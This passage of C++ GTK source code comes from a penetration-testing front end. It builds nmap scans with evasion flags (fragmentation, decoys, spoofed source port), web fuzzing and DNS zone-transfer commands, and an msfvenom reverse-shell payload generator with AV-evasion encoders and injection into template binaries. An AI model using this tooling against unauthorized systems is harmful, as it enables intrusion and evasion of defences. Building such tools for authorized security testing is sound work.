        nmap_cmd_preview_entry.set_editable(false);
        nmap_cmd_preview_entry.get_style_context()->add_class("console-view");

        nmap_copy_cmd_btn.signal_clicked().connect([this]() {
            auto cb = Gtk::Clipboard::get_for_display(get_display());
            cb->set_text(nmap_cmd_preview_entry.get_text());
            append_console_output("[✓] Command copied to clipboard: " + nmap_cmd_preview_entry.get_text() + "\n");
        });

        nmap_run_btn.get_style_context()->add_class("action-btn");
        nmap_run_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_run_nmap_scan));

        cmd_row->pack_start(*cmd_lbl, Gtk::PACK_SHRINK);
        cmd_row->pack_start(nmap_cmd_preview_entry, Gtk::PACK_EXPAND_WIDGET);
        cmd_row->pack_start(nmap_copy_cmd_btn, Gtk::PACK_SHRINK);
        cmd_row->pack_start(nmap_run_btn, Gtk::PACK_SHRINK);
        nmap_panel.pack_start(*cmd_row, Gtk::PACK_SHRINK);

        nmap_scroll.set_policy(Gtk::POLICY_NEVER, Gtk::POLICY_AUTOMATIC);
        nmap_scroll.add(nmap_panel);

        stack.add(nmap_scroll, "nmap_page", "🎯 Host & Port Scanner (Nmap)");
        update_nmap_command_preview();
    }

    std::vector<std::string> build_nmap_args() {
        std::vector<std::string> args = {"nmap"};
        std::string target = nmap_target_entry.get_text();

        // Scan technique
        std::string st = nmap_scan_type_combo.get_active_text();
        bool is_ping_sweep = (st.find("-sn") != std::string::npos);

        if (st.find("-sS") != std::string::npos) args.push_back("-sS");
        else if (st.find("-sT") != std::string::npos) args.push_back("-sT");
        else if (st.find("-sU") != std::string::npos) args.push_back("-sU");
        else if (is_ping_sweep) args.push_back("-sn");
        else if (st.find("-sF") != std::string::npos) args.push_back("-sF");
        else if (st.find("-sN") != std::string::npos) args.push_back("-sN");
        else if (st.find("-sX") != std::string::npos) args.push_back("-sX");
        else if (st.find("-sA") != std::string::npos) args.push_back("-sA");

        // Ping Probe
        std::string pt = nmap_ping_type_combo.get_active_text();
        if (pt.find("-PE") != std::string::npos) args.push_back("-PE");
        else if (pt.find("-PP") != std::string::npos) args.push_back("-PP");
        else if (pt.find("-PR") != std::string::npos) args.push_back("-PR");

        if (nmap_pn_check.get_active()) args.push_back("-Pn");

        // Only add port options, detection, and scripts if NOT a ping sweep (-sn)
        if (!is_ping_sweep) {
            std::string port_scope = nmap_port_scope_combo.get_active_text();
            if (port_scope.find("-F") != std::string::npos) {
                args.push_back("-F");
            } else if (port_scope.find("-p-") != std::string::npos) {
                args.push_back("-p-");
            } else if (port_scope.find("Top N Ports") != std::string::npos) {
                std::string n = nmap_port_custom_entry.get_text();
                if (n.empty()) n = "50";
                args.push_back("--top-ports");
                args.push_back(n);
            } else if (port_scope.find("Core Web & Admin Ports") != std::string::npos) {
                args.push_back("-p");
                args.push_back("21,22,23,25,53,80,110,139,143,443,445,1433,3306,3389,8080");
            } else if (port_scope.find("Custom Port / Range") != std::string::npos) {
                std::string c = nmap_port_custom_entry.get_text();
                if (!c.empty()) {
                    args.push_back("-p");
                    args.push_back(c);
                }
            }

            // Detection (Requires port scan; invalid with -sn)
            if (nmap_sv_check.get_active()) args.push_back("-sV");
            if (nmap_os_check.get_active()) args.push_back("-O");
            if (nmap_agg_check.get_active()) args.push_back("-A");

            // Scripts
            std::vector<std::string> scripts;
            if (nmap_sc_check.get_active()) scripts.push_back("default");
            if (nmap_vuln_check.get_active()) scripts.push_back("vuln");
            if (nmap_auth_check.get_active()) scripts.push_back("auth");
            if (nmap_exploit_check.get_active()) scripts.push_back("exploit");
            if (nmap_malware_check.get_active()) scripts.push_back("malware");
            if (nmap_discovery_check.get_active()) scripts.push_back("discovery");
            std::string cs = nmap_custom_script_entry.get_text();
            if (!cs.empty()) scripts.push_back(cs);

            if (!scripts.empty()) {
                std::string script_arg = "--script=";
                for (size_t i = 0; i < scripts.size(); ++i) {
                    script_arg += scripts[i];
                    if (i + 1 < scripts.size()) script_arg += ",";
                }
                args.push_back(script_arg);
            }
        }

        if (nmap_traceroute_check.get_active()) args.push_back("--traceroute");

        // Timing
        std::string tm = nmap_timing_combo.get_active_text();
        if (tm.rfind("T4", 0) == 0) args.push_back("-T4");
        else if (tm.rfind("T3", 0) == 0) args.push_back("-T3");
        else if (tm.rfind("T2", 0) == 0) args.push_back("-T2");
        else if (tm.rfind("T1", 0) == 0) args.push_back("-T1");
        else if (tm.rfind("T0", 0) == 0) args.push_back("-T0");
        else if (tm.rfind("T5", 0) == 0) args.push_back("-T5");

        // Evasion & other
        if (nmap_frag_check.get_active()) args.push_back("-f");
        if (nmap_badsum_check.get_active()) args.push_back("--badsum");
        if (nmap_decoy_check.get_active()) { args.push_back("-D"); args.push_back("RND:5"); }
        if (nmap_srcport_check.get_active()) { args.push_back("--source-port"); args.push_back("53"); }
        if (nmap_open_check.get_active()) args.push_back("--open");
        if (nmap_reason_check.get_active()) args.push_back("--reason");
        if (nmap_trace_check.get_active()) args.push_back("--packet-trace");

        std::string vb = nmap_verbose_combo.get_active_text();
        if (vb.find("Very Verbose") != std::string::npos) args.push_back("-vv");
        else if (vb.find("Verbose (-v)") != std::string::npos) args.push_back("-v");

        // Real-time progress updates so UI never appears stalled
        args.push_back("--stats-every");
        args.push_back("3s");

        if (!target.empty()) args.push_back(target);
        return args;
    }

    void update_nmap_command_preview() {
        auto args = build_nmap_args();
        std::string full_cmd;
        for (const auto& a : args) full_cmd += a + " ";
        nmap_cmd_preview_entry.set_text(full_cmd);
    }

    void on_nmap_preset_changed() {
        std::string p = nmap_profile_combo.get_active_text();
        if (p.rfind("🚀 Fast Host Discovery", 0) == 0) {
            nmap_scan_type_combo.set_active(4); // -sn
            nmap_sv_check.set_active(false);
            nmap_os_check.set_active(false);
            nmap_agg_check.set_active(false);
            nmap_sc_check.set_active(false);
            nmap_vuln_check.set_active(false);
            nmap_verbose_combo.set_active(1); // -v
        } else if (p.rfind("⚡ Quick Scan", 0) == 0) {
            nmap_scan_type_combo.set_active(0);
            nmap_port_scope_combo.set_active(0); // -F
            nmap_sv_check.set_active(false);
            nmap_os_check.set_active(false);
            nmap_agg_check.set_active(false);
            nmap_sc_check.set_active(false);
            nmap_vuln_check.set_active(false);
            nmap_timing_combo.set_active(0); // -T4
        } else if (p.rfind("🔍 Standard Service", 0) == 0) {
            nmap_scan_type_combo.set_active(0);
            nmap_port_scope_combo.set_active(1); // 1000 ports
            nmap_sv_check.set_active(true);
            nmap_sc_check.set_active(true);
            nmap_os_check.set_active(false);
            nmap_vuln_check.set_active(false);
            nmap_timing_combo.set_active(0); // -T4
        } else if (p.rfind("💥 Full Port Blitz", 0) == 0) {
            nmap_scan_type_combo.set_active(0);
            nmap_port_scope_combo.set_active(2); // -p-
            nmap_sv_check.set_active(true);
            nmap_sc_check.set_active(true);
            nmap_os_check.set_active(true);
            nmap_agg_check.set_active(true);
            nmap_timing_combo.set_active(0); // -T4
        } else if (p.rfind("🛡️ Vulnerability Audit", 0) == 0) {
            nmap_scan_type_combo.set_active(0);
            nmap_port_scope_combo.set_active(1); // 1000 ports
            nmap_sv_check.set_active(true);
            nmap_sc_check.set_active(false);
            nmap_vuln_check.set_active(true);
            nmap_timing_combo.set_active(0); // -T4
        } else if (p.rfind("🥷 Stealth SYN Scan", 0) == 0) {
            nmap_scan_type_combo.set_active(1); // -sS
            nmap_pn_check.set_active(true);
            nmap_frag_check.set_active(true);
            nmap_timing_combo.set_active(2); // -T2
        } else if (p.rfind("🌐 Web Server Audit", 0) == 0) {
            nmap_port_scope_combo.set_active(5); // custom
            nmap_port_custom_entry.set_text("80,443,8080,8443");
            nmap_sv_check.set_active(true);
            nmap_custom_script_entry.set_text("http-title,http-headers,http-enum");
        }
        update_nmap_command_preview();
    }

    // --- Page 3: DNS & Web Recon ---
    void build_dns_panel() {
        dns_panel.get_style_context()->add_class("tool-page");

        Gtk::Label* header = Gtk::manage(new Gtk::Label("DNS Mapping, Web Reconnaissance & Subdomain Discovery"));
        header->get_style_context()->add_class("form-header");
        header->set_xalign(0);
        dns_panel.pack_start(*header, Gtk::PACK_SHRINK);

        // Target Row + Quick Sync
        Gtk::Box* target_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* t_lbl = Gtk::manage(new Gtk::Label("Target Domain / URL / Host:"));
        t_lbl->set_xalign(0);
        dns_target_entry.set_placeholder_text("e.g. example.com or https://example.com or 192.168.1.50");
        dns_target_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_dns_command_preview));

        dns_sync_target_btn.signal_clicked().connect([this]() {
            std::string id = active_hosts_combo.get_active_id();
            if (id.empty()) {
                id = nmap_target_entry.get_text();
            }
            if (!id.empty()) {
                dns_target_entry.set_text(id);
                update_dns_command_preview();
            } else {
                Gtk::MessageDialog dlg(*this, "No live targets discovered yet. Enter target manually or run an Nmap scan first.", false, Gtk::MESSAGE_INFO);
                dlg.run();
            }
        });

        target_row->pack_start(*t_lbl, Gtk::PACK_SHRINK);
        target_row->pack_start(dns_target_entry, Gtk::PACK_EXPAND_WIDGET);
        target_row->pack_start(dns_sync_target_btn, Gtk::PACK_SHRINK);
        dns_panel.pack_start(*target_row, Gtk::PACK_SHRINK);

        // Mode / Technique Selection Row
        Gtk::Box* mode_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* m_lbl = Gtk::manage(new Gtk::Label("Recon Technique:"));
        m_lbl->set_xalign(0);
        dns_mode_combo.append("1. 🌐 Web Fuzzing (ffuf - Fast Directory & File Bruteforce)");
        dns_mode_combo.append("2. 🌐 Web Fuzzing (dirb - Classic Directory Scanner)");
        dns_mode_combo.append("3. 🛡️ HTTP Security Headers & Tech Audit (curl)");
        dns_mode_combo.append("4. 🔒 SSL/TLS Certificate SANs Subdomain Scraping (openssl)");
        dns_mode_combo.append("5. ⚡ DNS Zone Transfer Audit (dig AXFR)");
        dns_mode_combo.append("6. 🗺️ Subdomain Bruteforce Mapping (dnsmap)");
        dns_mode_combo.append("7. 📜 Comprehensive DNS Records (dig ANY)");
        dns_mode_combo.append("8. 🔗 CNAME & Subdomain Takeover Probing (dig CNAME)");
        dns_mode_combo.append("9. 🔎 WHOIS Registrar & Network Info (whois)");
        dns_mode_combo.append("10. 📡 Host & Reverse DNS Lookup (host -a)");
        dns_mode_combo.set_active(0);
        dns_mode_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::on_dns_mode_changed));

        mode_row->pack_start(*m_lbl, Gtk::PACK_SHRINK);
        mode_row->pack_start(dns_mode_combo, Gtk::PACK_EXPAND_WIDGET);
        dns_panel.pack_start(*mode_row, Gtk::PACK_SHRINK);

        // Web Fuzzing & Wordlist Options Box
        dns_web_options_box.get_style_context()->add_class("profile-card");
        Gtk::Label* opt_lbl = Gtk::manage(new Gtk::Label("Web Fuzzing & Wordlist Configuration"));
        opt_lbl->get_style_context()->add_class("field-label");
        opt_lbl->set_xalign(0);
        dns_web_options_box.pack_start(*opt_lbl, Gtk::PACK_SHRINK);

        // Wordlist preset row
        Gtk::Box* wl_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* w_lbl = Gtk::manage(new Gtk::Label("Wordlist:"));
        w_lbl->set_xalign(0);

        dns_wordlist_preset_combo.append("Default Dirb Common (/usr/share/dirb/wordlists/common.txt)");
        dns_wordlist_preset_combo.append("Dirb Big Wordlist (/usr/share/dirb/wordlists/big.txt)");
        dns_wordlist_preset_combo.append("Dirb Small Quick (/usr/share/dirb/wordlists/small.txt)");
        dns_wordlist_preset_combo.append("Dirb Apache Known Paths (/usr/share/dirb/wordlists/vulns/apache.txt)");
        dns_wordlist_preset_combo.append("Dirb Tomcat Known Paths (/usr/share/dirb/wordlists/vulns/tomcat.txt)");
        dns_wordlist_preset_combo.append("Custom Wordlist File...");
        dns_wordlist_preset_combo.set_active(0);

        dns_wordlist_entry.set_text("/usr/share/dirb/wordlists/common.txt");
        dns_wordlist_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_dns_command_preview));

        dns_wordlist_preset_combo.signal_changed().connect([this]() {
            int idx = dns_wordlist_preset_combo.get_active_row_number();
            switch (idx) {
                case 0: dns_wordlist_entry.set_text("/usr/share/dirb/wordlists/common.txt"); break;
                case 1: dns_wordlist_entry.set_text("/usr/share/dirb/wordlists/big.txt"); break;
                case 2: dns_wordlist_entry.set_text("/usr/share/dirb/wordlists/small.txt"); break;
                case 3: dns_wordlist_entry.set_text("/usr/share/dirb/wordlists/vulns/apache.txt"); break;
                case 4: dns_wordlist_entry.set_text("/usr/share/dirb/wordlists/vulns/tomcat.txt"); break;
                case 5: dns_wordlist_entry.set_text(""); break;
                default: break;
            }
            update_dns_command_preview();
        });

        dns_wordlist_browse_btn.signal_clicked().connect([this]() {
            Gtk::FileChooserDialog dialog(*this, "Select Custom Wordlist", Gtk::FILE_CHOOSER_ACTION_OPEN);
            dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
            dialog.add_button("Select", Gtk::RESPONSE_OK);
            if (dialog.run() == Gtk::RESPONSE_OK) {
                dns_wordlist_preset_combo.set_active(5); // Custom
                dns_wordlist_entry.set_text(dialog.get_filename());
                update_dns_command_preview();
            }
        });

        wl_row->pack_start(*w_lbl, Gtk::PACK_SHRINK);
        wl_row->pack_start(dns_wordlist_preset_combo, Gtk::PACK_SHRINK);
        wl_row->pack_start(dns_wordlist_entry, Gtk::PACK_EXPAND_WIDGET);
        wl_row->pack_start(dns_wordlist_browse_btn, Gtk::PACK_SHRINK);
        dns_web_options_box.pack_start(*wl_row, Gtk::PACK_SHRINK);

        // Extensions, Status Codes, and Threads row
        Gtk::Box* ext_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* ext_lbl = Gtk::manage(new Gtk::Label("File Extensions:"));
        dns_ext_entry.set_text(".php,.html,.txt,.json,.bak,.env");
        dns_ext_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_dns_command_preview));

        Gtk::Label* st_lbl = Gtk::manage(new Gtk::Label("Match Status Codes:"));
        dns_status_entry.set_text("200,204,301,302,307,401,403");
        dns_status_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_dns_command_preview));

        Gtk::Label* th_lbl = Gtk::manage(new Gtk::Label("Speed:"));
        dns_threads_combo.append("20 Threads (Gentle)");
        dns_threads_combo.append("40 Threads (Balanced)");
        dns_threads_combo.append("80 Threads (High Speed)");
        dns_threads_combo.set_active(1);
        dns_threads_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_dns_command_preview));

        ext_row->pack_start(*ext_lbl, Gtk::PACK_SHRINK);
        ext_row->pack_start(dns_ext_entry, Gtk::PACK_EXPAND_WIDGET);
        ext_row->pack_start(*st_lbl, Gtk::PACK_SHRINK);
        ext_row->pack_start(dns_status_entry, Gtk::PACK_SHRINK);
        ext_row->pack_start(*th_lbl, Gtk::PACK_SHRINK);
        ext_row->pack_start(dns_threads_combo, Gtk::PACK_SHRINK);
        dns_web_options_box.pack_start(*ext_row, Gtk::PACK_SHRINK);

        dns_panel.pack_start(dns_web_options_box, Gtk::PACK_SHRINK);

        // Live Command Preview & Action Bar
        Gtk::Box* cmd_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 8));
        Gtk::Label* cmd_lbl = Gtk::manage(new Gtk::Label("Live Command:"));
        dns_cmd_preview_entry.set_editable(false);
        dns_cmd_preview_entry.get_style_context()->add_class("console-view");

        dns_copy_cmd_btn.signal_clicked().connect([this]() {
            auto cb = Gtk::Clipboard::get_for_display(get_display());
            cb->set_text(dns_cmd_preview_entry.get_text());
            append_console_output("[✓] Command copied to clipboard: " + dns_cmd_preview_entry.get_text() + "\n");
        });

        dns_run_btn.get_style_context()->add_class("action-btn");
        dns_run_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_run_dns_recon));

        cmd_row->pack_start(*cmd_lbl, Gtk::PACK_SHRINK);
        cmd_row->pack_start(dns_cmd_preview_entry, Gtk::PACK_EXPAND_WIDGET);
        cmd_row->pack_start(dns_copy_cmd_btn, Gtk::PACK_SHRINK);
        cmd_row->pack_start(dns_run_btn, Gtk::PACK_SHRINK);
        dns_panel.pack_start(*cmd_row, Gtk::PACK_SHRINK);

        update_dns_command_preview();

        dns_scroll.set_policy(Gtk::POLICY_NEVER, Gtk::POLICY_AUTOMATIC);
        dns_scroll.add(dns_panel);
        stack.add(dns_scroll, "dns_page", "🌐 DNS & Web Recon");
    }

    void on_dns_mode_changed() {
        std::string mode = dns_mode_combo.get_active_text();
        bool is_web = (mode.find("Web Fuzzing") != std::string::npos);
        bool is_dnsmap = (mode.find("dnsmap") != std::string::npos);
        dns_web_options_box.set_sensitive(is_web || is_dnsmap);
        update_dns_command_preview();
    }

    std::vector<std::string> build_dns_args() {
        std::string raw_target = dns_target_entry.get_text();
        if (raw_target.empty()) raw_target = "example.com";

        std::string mode = dns_mode_combo.get_active_text();
        std::string host = SecurityUtils::extract_host_domain(raw_target);
        std::string web_url = SecurityUtils::normalize_url(raw_target);

        std::string wl = dns_wordlist_entry.get_text();
        if (wl.empty()) {
            wl = "/usr/share/dirb/wordlists/common.txt";
        }
        std::string exts = dns_ext_entry.get_text();
        std::string status_codes = dns_status_entry.get_text();
        if (status_codes.empty()) status_codes = "200,204,301,302,307,401,403";

        std::string threads = "40";
        std::string th_choice = dns_threads_combo.get_active_text();
        if (th_choice.find("20") != std::string::npos) threads = "20";
        else if (th_choice.find("80") != std::string::npos) threads = "80";

        std::vector<std::string> args;

        if (mode.find("ffuf") != std::string::npos) {
            std::string fuzz_url = web_url;
            if (fuzz_url.back() != '/') fuzz_url += "/";
            fuzz_url += "FUZZ";

            args = {"ffuf", "-u", fuzz_url, "-w", wl, "-mc", status_codes, "-t", threads, "-c", "-v"};
            if (!exts.empty()) {
                args.push_back("-e");
                args.push_back(exts);
            }
        } else if (mode.find("dirb") != std::string::npos) {
            args = {"dirb", web_url, wl, "-S", "-r"};
            if (!exts.empty()) {
                args.push_back("-X");
                args.push_back(exts);
            }
        } else if (mode.find("curl") != std::string::npos) {
            args = {"curl", "-ILsk", "--max-time", "15", web_url};
        } else if (mode.find("openssl") != std::string::npos) {
            std::string script = "echo '=== Querying SSL Certificate SANs for '$1' ==='; "
                                 "openssl s_client -connect \"$1:443\" -servername \"$1\" </dev/null 2>/dev/null | "
                                 "openssl x509 -noout -text | grep -A 2 -E 'Subject Alternative Name' | "
                                 "tr ',' '\\n' | grep 'DNS:' | sed 's/^[ \\t]*DNS://g' | sort -u";
            args = {"/bin/bash", "-c", script, "bash", host};
        } else if (mode.find("Zone Transfer") != std::string::npos) {
            std::string script = "echo '=== Testing DNS Zone Transfer (AXFR) for '$1' ==='; "
                                 "for ns in $(dig +short NS \"$1\"); do "
                                 "echo '[*] Testing nameserver: '$ns; "
                                 "dig +nocmd +noall +answer AXFR \"@$ns\" \"$1\"; "
                                 "done";
            args = {"/bin/bash", "-c", script, "bash", host};
        } else if (mode.find("dnsmap") != std::string::npos) {
            args = {"dnsmap", host};
            if (!dns_wordlist_entry.get_text().empty()) {
                args.push_back("-w");
                args.push_back(dns_wordlist_entry.get_text());
            }
        } else if (mode.find("Comprehensive DNS Records") != std::string::npos) {
            args = {"dig", "+nocmd", host, "ANY", "+multiline", "+noall", "+answer"};
        } else if (mode.find("CNAME") != std::string::npos) {
            args = {"dig", "+nocmd", host, "CNAME", "+multiline", "+noall", "+answer"};
        } else if (mode.find("whois") != std::string::npos) {
            args = {"whois", host};
        } else if (mode.find("host -a") != std::string::npos) {
            args = {"host", "-a", host};
        } else {
            args = {"dig", "+nocmd", host, "ANY"};
        }

        return args;
    }

    void update_dns_command_preview() {
        auto args = build_dns_args();
        std::string full_cmd;
        if (args.size() >= 3 && args[0] == "/bin/bash" && args[1] == "-c") {
            std::string target = args.size() > 4 ? args[4] : "";
            std::string mode = dns_mode_combo.get_active_text();
            if (mode.find("openssl") != std::string::npos) {
                full_cmd = "openssl s_client -connect " + target + ":443 -servername " + target + " | openssl x509 -noout -text (SANs extract)";
            } else if (mode.find("Zone Transfer") != std::string::npos) {
                full_cmd = "for ns in $(dig +short NS " + target + "); do dig AXFR @$ns " + target + "; done";
            } else {
                full_cmd = args[2] + " " + target;
            }
        } else {
            for (const auto& a : args) full_cmd += a + " ";
        }
        dns_cmd_preview_entry.set_text(full_cmd);
    }

    // --- Page 4: Payload Generator (MSFVenom) ---
    void build_payload_panel() {
        payload_panel.get_style_context()->add_class("tool-page");

        // Header
        Gtk::Label* header = Gtk::manage(new Gtk::Label("Metasploit Payload & Reverse Shell Generator"));
        header->get_style_context()->add_class("form-header");
        header->set_xalign(0);
        payload_panel.pack_start(*header, Gtk::PACK_SHRINK);

        // Platform & Payload Selection
        Gtk::Box* os_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* o_lbl = Gtk::manage(new Gtk::Label("Target Platform & Payload:"));
        o_lbl->set_xalign(0);

        payload_os_combo.append("Windows x64 - Encrypted HTTPS (windows/x64/meterpreter_reverse_https -> .exe)");
        payload_os_combo.append("Windows x64 - Stageless Meterpreter (windows/x64/meterpreter_reverse_tcp -> .exe)");
        payload_os_combo.append("Windows x64 - Staged Meterpreter (windows/x64/meterpreter/reverse_tcp -> .exe)");
        payload_os_combo.append("Windows x64 - Command Shell (windows/x64/shell_reverse_tcp -> .exe)");
        payload_os_combo.append("Windows x86 - Encrypted HTTPS (windows/meterpreter_reverse_https -> .exe)");
        payload_os_combo.append("Windows x86 - Stageless Meterpreter (windows/meterpreter_reverse_tcp -> .exe)");
        payload_os_combo.append("Windows x86 - Staged Meterpreter (windows/meterpreter/reverse_tcp -> .exe)");
        payload_os_combo.append("Windows x86 - Command Shell (windows/shell_reverse_tcp -> .exe)");
        payload_os_combo.append("Linux x64 - Stageless Meterpreter (linux/x64/meterpreter_reverse_tcp -> .elf)");
        payload_os_combo.append("Linux x64 - Staged Meterpreter (linux/x64/meterpreter/reverse_tcp -> .elf)");
        payload_os_combo.append("Linux x64 - Command Shell (linux/x64/shell_reverse_tcp -> .elf)");
        payload_os_combo.append("Linux x86 - Staged Meterpreter (linux/x86/meterpreter/reverse_tcp -> .elf)");
        payload_os_combo.append("Linux x86 - Command Shell (linux/x86/shell_reverse_tcp -> .elf)");
        payload_os_combo.append("macOS Apple Silicon ARM64 (osx/aarch64/meterpreter_reverse_tcp -> .macho)");
        payload_os_combo.append("macOS Intel x64 (osx/x64/meterpreter_reverse_tcp -> .macho)");
        payload_os_combo.append("Android APK - Encrypted HTTPS (android/meterpreter_reverse_https -> .apk)");
        payload_os_combo.append("Android APK - Meterpreter TCP (android/meterpreter/reverse_tcp -> .apk)");
        payload_os_combo.append("PHP Web Shell (php/meterpreter_reverse_tcp -> .php)");
        payload_os_combo.append("Python Shell (python/meterpreter_reverse_tcp -> .py)");
        payload_os_combo.append("Bash Unix Shell (cmd/unix/reverse_bash -> .sh)");
        payload_os_combo.append("PowerShell Windows Shell (windows/x64/powershell_reverse_tcp -> .ps1)");
        payload_os_combo.set_active(0);
        payload_os_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::on_payload_os_changed));

        os_row->pack_start(*o_lbl, Gtk::PACK_SHRINK);
        os_row->pack_start(payload_os_combo, Gtk::PACK_EXPAND_WIDGET);
        payload_panel.pack_start(*os_row, Gtk::PACK_SHRINK);

        // LHOST & LPORT
        Gtk::Box* net_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* lh_lbl = Gtk::manage(new Gtk::Label("LHOST (Attacker IP):"));
        net_row->pack_start(*lh_lbl, Gtk::PACK_SHRINK);
        net_row->pack_start(payload_lhost_combo, Gtk::PACK_EXPAND_WIDGET);
        payload_lhost_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));

        payload_refresh_ip_btn.signal_clicked().connect([this]() {
            refresh_network_interfaces();
            update_payload_command_preview();
        });
        net_row->pack_start(payload_refresh_ip_btn, Gtk::PACK_SHRINK);

        Gtk::Label* lp_lbl = Gtk::manage(new Gtk::Label("LPORT:"));
        payload_lport_entry.set_text("4444");
        payload_lport_entry.set_width_chars(8);
        payload_lport_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));
        net_row->pack_start(*lp_lbl, Gtk::PACK_SHRINK);
        net_row->pack_start(payload_lport_entry, Gtk::PACK_SHRINK);
        payload_panel.pack_start(*net_row, Gtk::PACK_SHRINK);

        // Obfuscation, Encoders & Template Box
        Gtk::Box* obf_box = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_VERTICAL, 8));
        obf_box->get_style_context()->add_class("profile-card");
        Gtk::Label* obf_lbl = Gtk::manage(new Gtk::Label("Evasion, Encoders & Template Injection"));
        obf_lbl->get_style_context()->add_class("field-label");
        obf_lbl->set_xalign(0);
        obf_box->pack_start(*obf_lbl, Gtk::PACK_SHRINK);

        // Row 1: Encoder, Iterations, Bad Characters
        Gtk::Box* enc_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* enc_lbl = Gtk::manage(new Gtk::Label("Encoder:"));
        payload_encoder_combo.append("None (Raw / Native)");
        payload_encoder_combo.append("x86/shikata_ga_nai (Polymorphic XOR)");
        payload_encoder_combo.append("x64/zutto_dekiru");
        payload_encoder_combo.append("x86/xor_dynamic");
        payload_encoder_combo.append("cmd/powershell_base64");
        payload_encoder_combo.set_active(0);
        payload_encoder_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));

        Gtk::Label* iter_lbl = Gtk::manage(new Gtk::Label("Iterations:"));
        payload_iterations_entry.set_text("1");
        payload_iterations_entry.set_width_chars(4);
        payload_iterations_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));

        Gtk::Label* bad_lbl = Gtk::manage(new Gtk::Label("Bad Chars (-b):"));
        payload_badchars_entry.set_placeholder_text(R"(e.g. \x00\x0a\x0d)");
        payload_badchars_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));

        enc_row->pack_start(*enc_lbl, Gtk::PACK_SHRINK);
        enc_row->pack_start(payload_encoder_combo, Gtk::PACK_EXPAND_WIDGET);
        enc_row->pack_start(*iter_lbl, Gtk::PACK_SHRINK);
        enc_row->pack_start(payload_iterations_entry, Gtk::PACK_SHRINK);
        enc_row->pack_start(*bad_lbl, Gtk::PACK_SHRINK);
        enc_row->pack_start(payload_badchars_entry, Gtk::PACK_SHRINK);
        obf_box->pack_start(*enc_row, Gtk::PACK_SHRINK);

        // Row 2: Template Injection (-x) & Keep Execution (-k)
        Gtk::Box* tmpl_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* tmpl_lbl = Gtk::manage(new Gtk::Label("Inject into Template (-x):"));
        payload_template_entry.set_placeholder_text("Path to existing binary (e.g. /usr/bin/whois or calc.exe)");
        payload_template_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));

        payload_template_browse_btn.signal_clicked().connect([this]() {
            Gtk::FileChooserDialog dialog(*this, "Select Template Binary", Gtk::FILE_CHOOSER_ACTION_OPEN);
            dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
            dialog.add_button("Select", Gtk::RESPONSE_OK);
            if (dialog.run() == Gtk::RESPONSE_OK) {
                payload_template_entry.set_text(dialog.get_filename());
                update_payload_command_preview();
            }
        });

        payload_template_keep_check.set_active(true);
        payload_template_keep_check.signal_toggled().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));

        tmpl_row->pack_start(*tmpl_lbl, Gtk::PACK_SHRINK);
        tmpl_row->pack_start(payload_template_entry, Gtk::PACK_EXPAND_WIDGET);
        tmpl_row->pack_start(payload_template_browse_btn, Gtk::PACK_SHRINK);
        tmpl_row->pack_start(payload_template_keep_check, Gtk::PACK_SHRINK);
        obf_box->pack_start(*tmpl_row, Gtk::PACK_SHRINK);

        payload_panel.pack_start(*obf_box, Gtk::PACK_SHRINK);

        // Output File
        Gtk::Box* out_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* out_lbl = Gtk::manage(new Gtk::Label("Output File:"));
        payload_output_entry.set_text("payload.exe");
        payload_output_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));

        payload_browse_btn.signal_clicked().connect([this]() {
            Gtk::FileChooserDialog dialog(*this, "Save Payload As", Gtk::FILE_CHOOSER_ACTION_SAVE);
            dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
            dialog.add_button("Save", Gtk::RESPONSE_OK);
            dialog.set_current_name(payload_output_entry.get_text());
            if (dialog.run() == Gtk::RESPONSE_OK) {
                payload_output_entry.set_text(dialog.get_filename());
                update_payload_command_preview();
            }
        });
        out_row->pack_start(*out_lbl, Gtk::PACK_SHRINK);
        out_row->pack_start(payload_output_entry, Gtk::PACK_EXPAND_WIDGET);
        out_row->pack_start(payload_browse_btn, Gtk::PACK_SHRINK);
        payload_panel.pack_start(*out_row, Gtk::PACK_SHRINK);

        // Live Command Preview & Action Bar
        Gtk::Box* cmd_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 8));
        Gtk::Label* cmd_lbl = Gtk::manage(new Gtk::Label("Live Command:"));
        payload_cmd_preview_entry.set_editable(false);
        payload_cmd_preview_entry.get_style_context()->add_class("console-view");

